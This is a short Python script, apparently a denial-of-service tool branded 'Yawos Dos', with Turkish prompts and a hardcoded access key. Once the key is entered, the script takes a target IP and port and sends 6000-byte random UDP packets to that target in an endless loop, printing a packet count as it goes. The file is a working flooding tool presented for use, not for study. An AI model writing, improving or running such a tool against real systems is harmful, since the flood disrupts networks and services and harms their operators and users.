import os
import socket
import time
import random
from colorama import Fore

banner = '''
▓██   ██▓ ▄▄▄       █     █░ ▒█████    ██████    ▓█████▄  ▒█████    ██████       ██▓███▓██   ██▓
 ▒██  ██▒▒████▄    ▓█░ █ ░█░▒██▒  ██▒▒██    ▒    ▒██▀ ██▌▒██▒  ██▒▒██    ▒      ▓██░  ██▒██  ██▒
  ▒██ ██░▒██  ▀█▄  ▒█░ █ ░█ ▒██░  ██▒░ ▓██▄      ░██   █▌▒██░  ██▒░ ▓██▄        ▓██░ ██▓▒▒██ ██░
  ░ ▐██▓░░██▄▄▄▄██ ░█░ █ ░█ ▒██   ██░  ▒   ██▒   ░▓█▄   ▌▒██   ██░  ▒   ██▒     ▒██▄█▓▒ ▒░ ▐██▓░
  ░ ██▒▓░ ▓█   ▓██▒░░██▒██▓ ░ ████▓▒░▒██████▒▒   ░▒████▓ ░ ████▓▒░▒██████▒▒ ██▓ ▒██▒ ░  ░░ ██▒▓░
   ██▒▒▒  ▒▒   ▓▒█░░ ▓░▒ ▒  ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░    ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░ ▒▓▒ ▒▓▒░ ░  ░ ██▒▒▒ 
 ▓██ ░▒░   ▒   ▒▒ ░  ▒ ░ ░    ░ ▒ ▒░ ░ ░▒  ░ ░    ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░ ░▒  ░▒ ░    ▓██ ░▒░ 
 ▒ ▒ ░░    ░   ▒     ░   ░  ░ ░ ░ ▒  ░  ░  ░      ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░   ░   ░░      ▒ ▒ ░░  
 ░ ░           ░  ░    ░        ░ ░        ░        ░        ░ ░        ░    ░          ░ ░     
 ░ ░                                              ░                          ░          ░ ░       



                                               
'''

def temizle():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def saldir():
    global ip
    global port

    bytes = random._urandom(6000)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sayac = 0
    while True:
        sock.sendto(bytes, (ip,port))
        sayac = sayac + 1
        print(f"Attack started , sending packets: {sayac}")

temizle()

print(f"{Fore.RED}{banner}{Fore.RESET}")
key = input(f"{Fore.CYAN}[ {Fore.GREEN}key {Fore.CYAN}] {Fore.YELLOW}>{Fore.RESET} ")

if key == "selam":
    try:
        ip = input(f"\n{Fore.CYAN}[ {Fore.GREEN}IP {Fore.CYAN}] {Fore.YELLOW}>{Fore.RESET} ")
        port = int(input(f"{Fore.CYAN}[ {Fore.GREEN}Port {Fore.CYAN}] {Fore.YELLOW}>{Fore.RESET} "))
        if port == "" or ip == "":
            print(f"\n{Fore.RED}Lütfen verileri düzgün girin!{Fore.RESET}")
        elif not port:
            print(f"\n{Fore.RED}Lütfen geçerli bir port giriniz!{Fore.RESET}")
        else:
            saldir()
    except ValueError:
        print(f"\n{Fore.RED}Lütfen düzgün bir veri giriniz!{Fore.RESET}")
else:
    print(f"\n\n{Fore.RED}HATALI KEY!!!{Fore.RESET}")
    time.sleep(3)
    temizle()
